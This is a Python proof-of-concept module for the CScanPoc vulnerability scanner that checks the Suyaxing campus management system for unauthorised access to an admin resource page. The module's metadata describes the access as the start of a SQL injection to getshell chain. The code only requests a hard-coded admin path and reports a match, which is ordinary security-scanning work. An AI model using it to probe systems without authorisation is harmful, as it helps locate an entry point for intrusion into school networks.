# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Suyaxing_0002'  # 平台漏洞编号，留空
    name = '苏亚星校园管理系统 后台未授权访问到SQL注入再到Getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-06-02'  # 漏洞公布时间
    desc = '''
        苏亚星校园网软件系统是一个校务管理系统、资源库管理系统、VOD点播系统、校园网站和虚拟社区进行整合而形成的校园网综合应用平台。
        南京苏亚星校园管理系统后台未授权访问到SQL注入再到Getshell.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=063128'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '苏亚星校园管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版


class Poc(ABPoc):
    poc_id = '830a1167-f621-4a56-9dac-d3ece89d0f78'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2010-063128
            payload = '/ws2004/sysManage/Resource/add/addResource.asp?FunID=1'
            #code, head, res, errcode, _ = curl.curl2(arg+payload)
            r = requests.get(self.target + payload)

            if r.status_code == 200 and 'zip' in r.text:
                #security_hole('未经授权访问 '+arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
